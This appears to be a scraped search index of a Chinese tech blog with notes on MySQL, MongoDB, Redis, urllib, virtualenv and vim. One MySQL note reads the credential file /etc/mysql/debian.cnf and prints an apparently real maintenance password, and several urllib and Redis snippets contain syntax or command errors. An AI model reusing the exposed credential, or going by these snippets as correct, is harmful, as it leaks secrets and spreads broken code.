一般安装完成之后都是会自动运行的。 如果没有运行你可以 sudo service mysql start 查看端口 sudo netstat -tap | grep mysql 运行它 ","date":"2019-03-02","objectID":"/ubuntu%E5%BD%BB%E5%BA%95%E5%8D%B8%E8%BD%BDmysql%E5%B9%B6%E4%B8%94%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/:0:0","tags":["mysql","ubuntu"],"title":"ubuntu彻底卸载mysql并且重新安装","uri":"/ubuntu%E5%BD%BB%E5%BA%95%E5%8D%B8%E8%BD%BDmysql%E5%B9%B6%E4%B8%94%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/"},{"categories":["数据库"],"content":"Mysql5.7这个版本的root密码在/etc/mysql/debian.cnf这个文件里面 使用sudo cat /etc/mysql/debian.cnf命令打开，你大概会看到如下内容，其中就包括Mysql的默认登陆名与密码 [client] host = localhost user = debian-sys-maint password = M1WVft5X8S80rhE0 socket = /var/run/mysqld/mysqld.sock [mysql_upgrade] host = localhost user = debian-sys-maint password = M1WVft5X8S80rhE0 socket = /var/run/mysqld/mysqld.sock 1、使用 mysql -u用户名 -p密码进行登陆， mysql -udebian-sys-maint -pM1WVft5X8S80rhE0 2、修改root用户密码 show databases； use mysql; update user set authentication_string=PASSWORD(\"密码\") where user='root'; update user set plugin=\"mysql_native_password\"; flush privileges; quit; 注:由于mysql5.7没有password字段，密码存储在authentication_string字段中 3、重新启动Mysql /etc/init.d/mysql restart 4、再次使用root用户登陆 登陆成功 ","date":"2019-03-01","objectID":"/%E5%AE%89%E8%A3%85mysql%E7%AB%9F%E7%84%B6%E6%B2%A1%E6%9C%89%E6%8F%90%E7%A4%BA%E4%BD%A0%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/:0:0","tags":["mysql","数据库"],"title":"安装mysql竟然没让你输入密码","uri":"/%E5%AE%89%E8%A3%85mysql%E7%AB%9F%E7%84%B6%E6%B2%A1%E6%9C%89%E6%8F%90%E7%A4%BA%E4%BD%A0%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/"},{"categories":["数据库"],"content":"﻿集合创建： db.createCollection(\"test_col,\",{capped:true, size:10}) # \"test_col\" 表名字(集合名字) # capped， 默认false，不设置上限，true设置上限 ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:1:0","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"查看当前数据库的集合： show collections ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:2:0","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"删除集合： db.集合名称.drop() ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:3:0","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"查询： # 查找集合中所有的数据 db.collection_name.find() # 查询文档 # pretty() 方法以格式化的方式来显示所有文档 美观 db.collection_name.find().pretty() # 指定_id查找 db.collection_name.find({_id:1}).pretty() _id： 如果插入数据不给定id，他会自动创建，可以通过id查找文档 ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:3:1","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"插入： # 向集合插入文档 db.collection_name.insert(document) 例子：db.col_test.insert({name:'xx', gender:'nan'}) （在集合不创建的时候也可以，集合会自动被创建） ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:3:2","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"更新： db.collection_name.update({}) # 更新文档 db.collection_name.update({'count':88},{$set:{'count':89}}) # count 由88变成89，只会作用于第一条数据 例子：db.集合名称.update({name:'xx'}, {$set:{'name':'xps'}}, {multi:true}) 将name为xx的改为yy， multi多行，默认false，只作用于第一个，为true时修改多条 # 更新多行，这个3.2的版本才支持 db.col_name.updateMany() ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:3:3","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"删除： db.collection_name.remove({}) # 删除集合所有文档 全部删除 db.集合名称.remove({gender:'nan', {justone:true}}) # 依据条件删除一条 justone默认false，删除多条 #删除多条3.2版本才有 db.col_name.deleteMany() # 删除集合 db.col_name.drop() ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:3:4","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"保存 （如果集合不存在，则执行添加操作） db.集合名称.save(document) ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:3:5","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"数据类型 object ID 文档ID （不会重复，12字节的16进制数） String 字符串 Boolean 存储一个布尔值 Integer 整数 Double 浮点值 Arrays 数组或列表 Object 用于嵌入式的文档，即一个值为一个文档 Null 存储NUll值 Times tamp 时间戳 Data 当前日期活时间的UNIX时间格式 object ID ： （不会重复，12字节的16进制数，前4当前时间，…) ","date":"2018-12-02","objectID":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/:3:6","tags":["MongoDB","数据库"],"title":"MongoDB简单的curd","uri":"/mongodb%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"categories":["数据库"],"content":"在Ubuntu系统中默认配置文件地址: /etc/redis/redis.conf port6379 # 默认端口 logfile /var/log/redis.log # 日志文件位置 dbfilename dump.rdb # RDB持久化数据文件 bind 0.0.0.0 # 指定IP进行监听 组成部分： 服务端: Redis-service 客户端: Redis-cli # 进入数据库 redis-cli # 退出 exit ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:0:0","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"基本数据类型： String:字符串 Hash:哈希 List:列表 Set:集合 Sorted set:有序集合 # 查看帮助 help @sorted_set ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:1:0","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"String:字符串 string是redis最基本的类型，一个key对应一个value。 # 设置值 SET key value # 得到值 GET key # 将key的值设置为新的，并返回旧的值 GETSET key value_new # 设置多个键值 MSET name xps sex nan #取出多个键的值 MGET name sex # 获取key的值的长度 STRLEN name # 将该值追加到name的值xps的后面 APPEND name ppp # 设置持续时间 SETEX name 10 xps # 如果该key有值就不执行 SET name xxx # 每次执行将value的数字加1 set age 10 INCR age # 每次执行将value的数字减1 DECR age ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:1:1","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"全局Key操作： keys * # 查看所有的键 DEL key EXISTS key RENAME old_key new_key TYPE key ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:1:2","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"Hash:哈希（字段里面也有值） Hashes类型看成具有String Key和String Value的map容器。 类似于这种结构： b = { one:xps two:xp three:x } # 设置该key字段的值 HSET key field value HSET b one xps HSET b one xps two xp three x # 获取该key字段的值 HGET key field HGET b one # 获取hash表里面所有的值 HVALS key Hvals b # 获取hash表里面所有的字段 Hkeys b # 获取hash表中的字段数量 HLEN b ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:1:3","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"List类型（例如：微博评论） List类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表 # 向列表头部插入数据（顺序：c,b,a） LPUSH names a b c # 插入数据（x,y,z） RPUSh names2 x y z # 获取列表里面某个索引对应的值 LINDEX key index LINDEX names 0 # 弹出并删除最后一个元素 RPOP names # 弹出并删除最前面一个元素 LPOP names # 列表的长度 LLEN key # LSET key index value ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:1:4","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"Set类型(微博粉丝，关注人) Set类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。 # 向集合添加成员 SADD setkey a b c d # 查看集合成员数量 SCARD key # 迭代集合中的所有元素 SMEMBERS key SMEMBERS setkey # 判断集合是否存在该元素(存在为1，不存在为0) SMEMBERS key value SMEMBERS setkey a SMEMBERS setkey z #删除并返回集合中的一个随机元素 SPOP setkey ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:1:5","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"Sorted Set类型（排行榜，top,直播） 每一个成员都会有一个分数(score)(权重)与之关联。成员是唯一的，但是分数(score)却是可以重复的。 # 向有序集合添加成员，并且给他权重 ZADD key score1 member1 [score2 member2] ZADD akey 1 a 2 b 3 c # 显示集合成员数 ZCARD zkey # 计算有序集合指定区的分数的成员数 ZCOUNT zkey 1 3 # 移除有序集合一个或多个成员 ZREM zkey number # 查找 迭代有序集合所有元素 ZSCAN zkeys ","date":"2018-12-01","objectID":"/redis%E8%A1%A5%E5%85%85/:1:6","tags":["redis","数据库"],"title":"redis基础","uri":"/redis%E8%A1%A5%E5%85%85/"},{"categories":["数据库"],"content":"﻿在Ubuntu系统中默认配置文件地址: /etc/redis/redis.conf port6379 # 默认端口 logfile /var/log/redis.log # 日志文件位置 dbfilename dump.rdb # RDB持久化数据文件 bind 0.0.0.0 # 指定IP进行监听 组成部分： 服务端: Redis-service 客户端: Redis-cli # 进入数据库 redis-cli # 退出 exit ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:0:0","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["数据库"],"content":"基本数据类型： String:字符串 Hash:哈希 List:列表 Set:集合 Sorted set:有序集合 # 查看帮助 help @sorted_set ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:0","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["数据库"],"content":"String:字符串 string是redis最基本的类型，一个key对应一个value。 # 设置值 SET key value # 得到值 GET key # 将key的值设置为新的，并返回旧的值 GETSET key value_new # 设置多个键值 MSET name xps sex nan #取出多个键的值 MGET name sex # 获取key的值的长度 STRLEN name # 将该值追加到name的值xps的后面 APPEND name ppp # 设置持续时间 SETEX name 10 xps # 如果该key有值就不执行 SET name xxx # 每次执行将value的数字加1 set age 10 INCR age # 每次执行将value的数字减1 DECR age ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:1","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["数据库"],"content":"全局Key操作： keys * # 查看所有的键 DEL key EXISTS key RENAME old_key new_key TYPE key ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:2","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["数据库"],"content":"Hash:哈希（字段里面也有值） Hashes类型看成具有String Key和String Value的map容器。 类似于这种结构： b = { one:xps two:xp three:x } # 设置该key字段的值 HSET key field value HSET b one xps HSET b one xps two xp three x # 获取该key字段的值 HGET key field HGET b one # 获取hash表里面所有的值 HVALS key Hvals b # 获取hash表里面所有的字段 Hkeys b # 获取hash表中的字段数量 HLEN b ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:3","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["数据库"],"content":"List类型（例如：微博评论） List类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表 # 向列表头部插入数据（顺序：c,b,a） LPUSH names a b c # 插入数据（x,y,z） RPUSh names2 x y z # 获取列表里面某个索引对应的值 LINDEX key index LINDEX names 0 # 弹出并删除最后一个元素 RPOP names # 弹出并删除最前面一个元素 LPOP names # 列表的长度 LLEN key # LSET key index value ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:4","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["数据库"],"content":"Set类型(微博粉丝，关注人) Set类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。 # 向集合添加成员 SADD setkey a b c d # 查看集合成员数量 SCARD key # 迭代集合中的所有元素 SMEMBERS key SMEMBERS setkey # 判断集合是否存在该元素(存在为1，不存在为0) SMEMBERS key value SMEMBERS setkey a SMEMBERS setkey z #删除并返回集合中的一个随机元素 SPOP setkey ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:5","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["数据库"],"content":"Sorted Set类型（排行榜，top,直播） 每一个成员都会有一个分数(score)(权重)与之关联。成员是唯一的，但是分数(score)却是可以重复的。 # 向有序集合添加成员，并且给他权重 ZADD key score1 member1 [score2 member2] ZADD akey 1 a 2 b 3 c # 显示集合成员数 ZCARD zkey # 计算有序集合指定区的分数的成员数 ZCOUNT zkey 1 3 # 移除有序集合一个或多个成员 ZREM zkey number # 查找 迭代有序集合所有元素 ZSCAN zkeys ","date":"2018-12-01","objectID":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:6","tags":["redis","数据库"],"title":"redis常用命令","uri":"/redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["爬虫"],"content":"urllib是Python自带的标准库，无需安装，直接可以用。 提供了如下功能： 网页请求 响应获取 代理和cookie设置 异常处理 URL解析 爬虫所需要的功能，基本上在urllib中都能找到，学习这个标准库，可以更加深入的理解后面更加便利的requests库。 urllib库 urlopen 语法 urllib.request.urlopen(url,data=None,[timeout,]*,cafile=None,capath=None,cadefault=False,context=None) #url:访问的网址 #data:额外的数据，如header，form data 用法 # request:GET import urllib.request response = urllib.request.urlopen('http://www.baidu.com') print(response.read().decode('utf-8')) # request: POST # http测试：http://httpbin.org/ import urllib.parse import urllib.request data = bytes(urllib.parse.urlencode({'word':'hello'}),encoding='utf8') response = urllib.request.urlopen('http://httpbin.org/post',data=data) print(response.read()) # 超时设置 import urllib.request response = urllib.request.urlopen('http://httpbin.org/get',timeout=1) print(response.read()) import socket import urllib.request import urllib.error try: response = urllib.request.urlopen('http://httpbin.org/get',timeout=0.1) except urllib.error.URLError as e: if isinstance(e.reason,socket.timeout): print('TIME OUT') 响应 # 响应类型 import urllib.open response = urllib.request.urlopen('https:///www.python.org') print(type(response)) # 状态码， 响应头 import urllib.request response = urllib.request.urlopen('https://www.python.org') print(response.status) print(response.getheaders()) # 获取响应头 print(response.getheader('Server')) # 得到指定的响应头 Request 声明一个request对象，该对象可以包括header等信息，然后用urlopen打开。 # 简单例子 import urllib.request request = urllib.request.Requests('https://python.org') response = urllib.request.urlopen(request) print(response.read().decode('utf-8')) # 增加header from urllib import request, parse url = 'http://httpbin.org/post' headers = { 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36' 'Host':'httpbin.org' } # 构造POST表格 dict = { 'name':'Germey' } data = bytes(parse.urlencode(dict),encoding='utf8') req = request.Request(url=url,data=data,headers=headers,method='POST') response = request.urlopen(req) print(response.read()).decode('utf-8') # 或者随后增加header from urllib import request, parse url = 'http://httpbin.org/post' dict = { 'name':'Germey' } req = request.Request(url=url,data=data,method='POST') req.add_hader('User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36') response = request.urlopen(req) print(response.read().decode('utf-8')) Handler：处理更加复杂的页面 代理 import urllib.request proxy_handler = urllib.request.ProxyHandler({ 'http':'http://127.0.0.1:9743' 'https':'https://127.0.0.1.9743' }) opener = urllib.request.build_openner(proxy_handler) response = opener.open('http://www.baidu.com') print(response.read()) Cookie:客户端用于记录用户身份,维持登录信息 import http.cookiejar, urllib.request cookie = http.cookiejar.CookieJar() handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open(\"http://www.baidu.com\") for item in cookie: print(item.name+\"=\"+item.value) # 保存cooki为文本 import http.cookiejar, urllib.request filename = \"cookie.txt\" # 保存类型有很多种 ## 类型1 cookie = http.cookiejar.MozillaCookieJar(filename) ## 类型2 cookie = http.cookiejar.LWPCookieJar(filename) handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open(\"http://www.baidu.com\") # 使用相应的方法读取 import http.cookiejar, urllib.request cookie = http.cookiejar.LWPCookieJar() cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True) handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open(\"http://www.baidu.com\") 异常处理 捕获异常，保证程序稳定运行 # 访问不存在的页面 from urllib import request, error try: response = request.urlopen('http://cuiqingcai.com/index.htm') except error.URLError as e: print(e.reason) # 先捕获子类错误 from urllib imort request, error try: response = request.urlopen('http://cuiqingcai.com/index.htm') except error.HTTPError as e: print(e.reason, e.code, e.headers, sep='\\n","date":"2018-11-21","objectID":"/urllib%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/:0:0","tags":["爬虫","python","urllib"],"title":"urllib库的基本使用","uri":"/urllib%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"},{"categories":["python"],"content":"注意： # 腾讯云的源有时候不行，可以更换源 pip3 install virtualenv -i https://pypi.doubanio.com/simple/ --user ","date":"2018-11-21","objectID":"/virtualenv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:0:0","tags":["virtualenv","python","虚拟环境"],"title":"virtualenv","uri":"/virtualenv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["python"],"content":"搭建虚拟环境 先安装 virtualenv, 再安装 virtualenvwrapper pip install virtaulenv pip install virtualenvwrapper 设置虚拟的环境变量 . 先找到 virtualenvwrapper.sh 文件 find / -name \"virtualenvwrapper.sh\" 写入 .bashrc 文件 export WORKON_HOME=$HOME/.virtualenvs source 这里写起前面找出来的文件 基本命令 # 创建虚拟环境 mkvirtualenv pyenv # 删除虚拟机环境 rmvirtualenv pyenv # 进入虚拟环境 workon pyenv # 推出虚拟环境 deactivate # 创建虚拟环境的是时候，指定 Python 版本 mkvirtualenv 如果报如下错误： ERROR: virtualenvwrapper could not find virtualenv in your path 因为是被安装在默认的Python目录下，添加软链接即可 ln -s /usr/bin/python36/bin/virtualenv /usr/local/bin/virtualenv 批处理安装库： requirements.txt pip freeze 冻结出所有包与版本号 导出：pip freeze \u003e requirements.txt 再安装: pip install -r requirements.txt 虚拟环境： windows激活虚拟环境 ：pycharm自动激活 cd 虚拟环境目录venv/Scripts/ active linux激活虚拟环境 ：source ./venv/bin/active ","date":"2018-11-21","objectID":"/virtualenv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:0:1","tags":["virtualenv","python","虚拟环境"],"title":"virtualenv","uri":"/virtualenv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["vim"],"content":"三种模式: 一般命令模式(默认,按住esc进入) 命令模式 编辑模式 h 左 j 下 l 右 k 上 w 移动到下一个单词词首 e 移动到下一个单词词尾 b 移动到上一个单词词首 2.进入插入模式 i 在当前光标出处编辑 I 大写的i 在行首插入 A 在行末插入 a 在光标后插入编辑 o 在当前行后插入一个新行 O 在当前行前插入一个新行 cw 替换从光标所在位置后到一个单词结尾的字符 3.1命令行模式下退出vim 命令 说明 :q! 强制退出，不保存 :q 退出 :wq! 强制保存并退出 :w \u003c文件路径\u003e 另存为 :saveas 文件路径 另存为 :x 保存并退出 :wq 保存并退出 3.2普通模式下退出vim 普通模式下输入Shift+zz即可保存退出vim 4. 普通模式下删除vim文本信息 进入普通模式，使用下列命令可以进行文本快速删除： 命令 说明 x 删除游标所在的字符 X 删除游标所在前一个字符 Delete 同x dd 删除整行 dw 删除一个单词（不适用中文） d$或D 删除至行尾 d^ 删除至行首 dG 删除到文档结尾处 d1G 删至文档首部 除此之外，你还可以在命令之前加上数字，表示一次删除多行，如： 2dd表示一次删除2行 2.1.1 重复执行上次命令 在普通模式下.(小数点)表示重复上一次的命令操作 普通模式下输入x，删除第一个字符，输入.(小数点)会再次删除一个字符，除此之外也可以重复dd的删除操作 2.1.2 执行指定次数相同的命令 进入普通模式输入N\u003ccommand\u003e，N 表示重复后面的次数，下面来练习： 打开文件文件进行编辑 $ vim protocols 下面你可以依次进行如下操作练习： 输入10x，删除10个连续字符 输入3dd，将会删除3行文本 在普通模式下，你还可以使用dw或者daw(delete a word)删除一个单词，所以你可以很容易的联想到dnw(n替换为相应数字) 表示删除n个单词 2.2.1 行间跳转 命令 说明 nG(n Shift+g) 游标移动到第 n 行**(如果默认没有显示行号，请先进入命令模式，输入:set nu以显示行号)** gg 游标移动到到第一行 G(Shift+g) 到最后一行 你在完成依次跳转后，可以使用 Ctrl+o 快速回到上一次(跳转前)光标所在位置,这个技巧很实用，比如当你在写代码时，忽然想起有个 bug，需要修改，这时候你跳过去改好了，只需要按下 Ctrl+o 就可以回到你之前的位置。vim 中会用很多类似的小技巧就等着你去发掘。 2.2.2 行内跳转 普通模式下使用下列命令在行内按照单词为单位进行跳转 命令 说明 w 到下一个单词的开头 e 到当前单词的结尾 b 到前一个单词的开头 ge 到前一个单词的结尾 0或^ 到行头 $ 到行尾 f\u003c字母\u003e 向后搜索\u003c字母\u003e并跳转到第一个匹配的位置(非常实用) F\u003c字母\u003e 向前搜索\u003c字母\u003e并跳转到第一个匹配的位置 t\u003c字母\u003e 向后搜索\u003c字母\u003e并跳转到第一个匹配位置之前的一个字母(不常用) T\u003c字母\u003e 向前搜索\u003c字母\u003e并跳转到第一个匹配位置之后的一个字母(不常用) 使用 ~ 将游标所在字母变成大写或小写 2.3.1 复制及粘贴文本 普通模式中使用y复制 普通模式中，yy复制游标所在的整行（3yy表示复制3行） 普通模式中，y^ 复制至行首，或y0。不含光标所在处字符。 普通模式中，y$ 复制至行尾。含光标所在处字符。 普通模式中，yw 复制一个单词。 普通模式中，y2w 复制两个单词。 普通模式中，yG 复制至文本末。 普通模式中，y1G 复制至文本开头。 普通模式中使用 p 粘贴 普通模式中，p(小写)代表粘贴至光标后（下） 普通模式中，P(大写)代表粘贴至光标前（上） 2.3.2 剪切及粘贴 其实前面讲得 dd 删除命令就是剪切，你每次 dd 删除文档内容后，便可以使用 p 来粘贴，也这一点可以让我们实现一个很爽快的功能——交换上下行： ddp ,就这么简单，即实现了快速交换光标所在行与它下面的行 2.1.1 替换和撤销(Undo)命令 替换和Undo命令都是针对普通模式下的操作 命令 说明 r+\u003c待替换字母\u003e 将游标所在字母替换为指定字母 R 连续替换，直到按下Esc cc 替换整行，即删除游标所在行，并进入插入模式 cw 替换一个单词，即删除一个单词，并进入插入模式 C(大写) 替换游标以后至行末 ~ 反转游标所在字母大小写 u{n} 撤销一次或n次操作 U(大写) 撤销当前行的所有修改 Ctrl+r redo，即撤销undo的操作 输入2G，跳转到 2 行 2.2.1 使用命令进行快速调整缩进操作 这一小节学习如何在vim中进行快速缩进，缩进操作均在普通模式下有效 打开文件进行编辑 $ vim protocols 普通模式下输入15G，跳转到15行 普通模式下输入\u003e\u003e 整行将向右缩进（使用，用于格式化代码超爽） 普通模式下输入\u003c\u003c 整行向左回退 普通模式下输入:进入命令行模式下对shiftwidth值进行设置可以控制缩进和回退的字符数 2.2.2 shiftwidth命令 shiftwidth命令是指上一节\u003e\u003e命令产生的缩进（可以简写成sw） 普通模式下输入:进入命令行模式下对shiftwidth值进行设置可以控制缩进和回退的字符数 获取目前的设定值 :set shiftwidth? 设置缩进为10个字符 :set shiftwidth=10 输入 ESC 回到普通模式，再次尝试 \u003e\u003e 看缩进量是否变化 2.2.3 调整文本位置 命令行模式下输入:ce(center)命令使本行内容居中 :ce 命令行模式下输入:ri(right)命令使本行文本靠右 :ri 命令行模式下输入:le(left)命令使本行内容靠左 :le 2.3.1 快速查找 普通模式下输入 / 然后键入需要查找的字符串 按回车后就会进行查找。？ 与/ 功能相同，只不过 ？ 是向上而 / 是向下查找。 进入查找之后，输入n 和 N 可以继续查找 n表示继续查找，N 反向查找 2.3.2 快速查找练习 使用 vim 打开文件进行编辑（搜索高亮需要在配置文件 .vimrc 中设置 set hls ，实验环境中已经设置好了） $ vim protocols 普通模式下输入/icmp然后回车即可查找字符串 icmp 普通模式下输入n查找下一个 icmp 普通模式下输入？tcp向上查找字符串 tcp 普通模式下输入N查找上一个出现的 tcp 命令行模式下输入 noh 然后回车即可取消搜索 2.3.3 高级查找 普通模式下输入\\*寻找游标所在处的单词 普通模式下输入\\#同上，但 \\# 是向前（上）找，\\*则是向后（下）找 普通模式下输入g\\*同\\* ，但部分符合该单词即可 普通模式下输入g\\#同\\# ，但部分符合该单词即可 以上查找n,N 的继续查找命令依然可以用 2.1.1 使用vim编辑多个文件 编辑多个文件有两种形式，一种是在进入vim前使用的参数就是多个文件。另一种就是进入vim后再编辑其他的文件。 同时创建两个新文件并编辑 $ vim 1.txt 2.txt 默认进入1.txt文件的编辑界面 命令行模式下输入 :n 编辑 2.txt 文件，可以加 ! 即 :n! 强制切换，之前一个文件的输入没有保存，仅仅切换到另一个文件 命令行模式下输入 :N 编辑 1.txt 文件，可以加 ! 即 :N! 强制切换，之前文件内的输入没有保存，仅仅是切换到另一个文件 2.1.2 进入vim后打开新文件 命令行模式下输入:e 3.txt 打开新文件3.txt 命令行模式下输入:e# 回到前一个文件 命令行模式下输入:ls可以列出以前编辑过的文档 命令行模式下输入:b 2.txt（或者编号）可以直接进入文件2.txt编辑 命令行模式下输入:bd 